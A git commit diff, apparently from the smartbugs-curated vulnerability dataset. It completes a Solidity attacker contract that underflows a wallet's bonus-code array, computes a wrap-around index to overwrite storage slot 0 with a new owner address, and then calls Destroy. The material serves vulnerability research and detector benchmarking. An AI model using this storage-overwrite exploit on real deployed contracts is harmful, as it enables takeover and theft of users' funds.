ddec7828bd4d7aadb39aeb779603bfd60454d5a4
Monica Jin <monicachenjin@gmail.com>
2024-07-22 14:08:54 +0100

    fix: arbitrary write exploit

--- smartbugs-curated/0.4.x/contracts/access_control/arbitrary_location_write_simple_attack.sol
+++ smartbugs-curated/0.4.x/contracts/access_control/arbitrary_location_write_simple_attack.sol
@@ -1,7 +1,6 @@
  pragma solidity ^0.4.25;
 
 import "../dataset/access_control/arbitrary_location_write_simple.sol";
-
  contract WalletAttacker {
     Wallet public target;
 
@@ -9,11 +8,15 @@ import "../dataset/access_control/arbitrary_location_write_simple.sol";
          target = Wallet(_target);
      }
 
-    function attack() public {
+    function attack(address new_owner) public {
         target.PopBonusCode();
+        uint256 slotIndex = uint256(keccak256(abi.encodePacked(uint256(0))));
+        uint256 overwriteIndex = 2**256 -1 - slotIndex + 1 + 1;
+
+        target.UpdateBonusCodeAt(overwriteIndex, uint(new_owner));
     }
 
-    function test(uint idx, uint c) public {
-        target.UpdateBonusCodeAt(idx, c);
+    function test() public {
+        target.Destroy();
     }
  }
